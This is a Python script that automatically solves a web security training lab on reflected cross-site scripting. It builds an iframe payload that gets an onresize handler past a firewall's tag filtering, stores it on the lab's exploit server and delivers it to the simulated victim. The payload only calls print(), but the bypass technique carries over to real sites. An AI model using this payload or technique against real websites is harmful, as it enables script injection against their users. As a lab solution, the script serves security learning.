import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

def xss_attack(url1, url2):
    # PREPRARE PAYLOAD
    xss_payload = "<iframe src=\"{0}/?search=%22%3E%3Cbody%20onresize=print()%3E\" onload=this.style.width='100px'>".format(url1)

    # STORE PAYLOAD ONTO THE EXPLOIT SERVER
    store_exploit_url = url2
    params = {
        'urlIsHttps' : 'on',
        'responseFile' :'/xss',
        'responseHead' : 'HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8',
        'responseBody' : xss_payload,
        'formAction' : 'DELIVER_TO_VICTIM'
    }
    r = requests.post(store_exploit_url, data=params, verify=False, proxies=proxies)
    
    # DELIVER PAYLOAD TO VICTIM
    deliver_url = url2 + '/deliver-to-victim'

    r = requests.get(deliver_url, verify=False, proxies=proxies)

    # CHECK IF EXPLOIT WAS SUCCESSFUL
    r = requests.get(url1, verify=False, proxies=proxies)
    if "Congratulations, you solved the lab!" not in r.text:
        print("[-] Error!")
        sys.exit(-1)
    print("[+] Exploit worked!")


def main():
    if len(sys.argv) !=3:
        print("[-] Usage: %s <url1> <url2>" % sys.argv[0])
        print("[-] Example: %s www.url1.com www.url2.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()
    exploitserver_url = sys.argv[2].strip()

    print("[+] Lab: Reflected XSS into HTML context with most tags and attributes blocked")
    print("""[+] This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.
    To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the print() function.""") 

    xss_attack(url, exploitserver_url)

if __name__ == "__main__":
    main()